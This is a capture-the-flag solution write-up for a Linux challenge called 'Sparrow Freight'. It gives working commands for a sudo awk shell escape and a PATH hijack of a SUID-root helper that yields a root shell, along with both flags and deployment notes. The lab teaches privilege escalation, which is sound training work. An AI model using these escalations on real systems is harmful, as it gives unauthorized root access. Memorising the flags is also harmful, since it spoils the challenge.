# Sparrow Freight - solution

Access: `ssh guest@<host> -p <port>` (password `guest`).

## Stage 1 - guest -> mel (sudo GTFObins) -> user flag
```
guest$ sudo -l
    (mel) NOPASSWD: /usr/bin/awk
guest$ sudo -u mel /usr/bin/awk 'BEGIN{system("/bin/bash")}'
mel$ id
uid=1001(mel) ... groups=...,1002(opsstaff)
mel$ cat /home/mel/user.txt
H7CTF{sud0_gtf0b1n_2_us3r_5parr0w}
```
`awk` can spawn a shell (`BEGIN{system(...)}`), so a NOPASSWD sudo rule for it = a shell as the
target user. (See GTFObins: awk.)

## Stage 2 - mel -> root (SUID PATH-hijack) -> root flag
`mel` is in `opsstaff`, which may run the SUID-root helper `/usr/local/bin/netmon`. It becomes root
and then calls `ip` / `ss` by bare name - so it trusts `$PATH`:
```
mel$ ls -l /usr/local/bin/netmon
-rwsr-x--- 1 root opsstaff ... /usr/local/bin/netmon    # SUID root, opsstaff-executable
mel$ cd $(mktemp -d)
mel$ printf '#!/bin/sh\ncat /root/root.txt\n' > ip     # or: exec /bin/sh  for a root shell
mel$ chmod +x ip
mel$ PATH=$PWD:$PATH netmon
H7CTF{p4th_h1j4ck_su1d_r00t_5parr0w}
```
`netmon` runs our `ip` as root. Swap the payload for `exec /bin/sh` to get a full root shell.

## Notes
- Both steps are pure DAC (no capability needed): `sudo`/SUID give euid=0, which reads root-owned
  files and is the root user. Runs under gVisor with drop-ALL caps as long as no_new_privs is off
  (`deploy.privesc: true`).
- Flags are static by default but the entrypoint honors `$USER_FLAG` / `$ROOT_FLAG` for per-team
  injection if we later want dynamic flags.
